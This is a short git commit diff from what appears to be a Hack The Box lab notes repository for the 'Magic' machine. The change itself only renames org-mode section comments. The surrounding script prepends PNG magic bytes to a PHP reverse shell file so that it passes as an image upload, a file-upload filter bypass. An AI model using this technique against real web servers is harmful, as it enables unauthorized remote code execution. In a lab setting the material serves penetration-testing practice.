9445d91c9bd1791b4fe0909195827bffac343346
Federico <federicolucaspontoriero@gmail.com>
2023-04-25 19:37:34 -0300

    Magic completed

--- HTB/Magic/magic.py
+++ HTB/Magic/magic.py
@@ -1,4 +1,4 @@
-# [[file:Magic.org::*Initial access][Initial access:4]]
+# [[file:Magic.org::*Crafting a bypass][Crafting a bypass:3]]
 #!/usr/bin/env python3
 
 magic = bytearray([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
@@ -8,4 +8,4 @@ with open("php-reverse-shell.php", "rb") as h:
 
 with open("reverse-shell.php.png", "wb") as h:
     h.write(magic + content)
-# Initial access:4 ends here
+# Crafting a bypass:3 ends here
